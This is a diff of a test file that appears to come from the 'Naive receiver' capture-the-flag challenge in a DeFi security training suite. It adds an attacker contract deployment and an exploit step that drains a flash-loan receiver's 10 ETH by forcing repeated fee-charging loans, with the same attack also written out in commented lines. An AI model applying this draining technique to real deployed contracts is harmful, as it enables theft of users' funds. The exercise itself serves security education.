@@ -11,11 +11,13 @@ describe('[Challenge] Naive receiver', function () {
     const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
 
     before(async function () {
+        // console.log("hello8878888888888888888")
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, attacker] = await ethers.getSigners();
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        const AttackNaiveReceiverFactory = await ethers.getContractFactory('AttackNaiveReceiver', deployer);
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
@@ -25,12 +27,30 @@ describe('[Challenge] Naive receiver', function () {
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+
+        this.attacker = await AttackNaiveReceiverFactory.deploy(this.pool.address);
+        // await deployer.sendTransaction({ to: this.attacker.address, value: ETHER_IN_RECEIVER });
+        // expect(await ethers.provider.pool(this.attacker.address)).to.be.equal(this.pool.address);
+        // console.log("Attacker Pool Address  : ",await this.attacker.pool())
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        
+        await this.attacker.attackReceiver(this.receiver.address, ethers.utils.parseEther('10'), 10);
+
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
+        // this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('10'));
     });
 
     after(async function () {
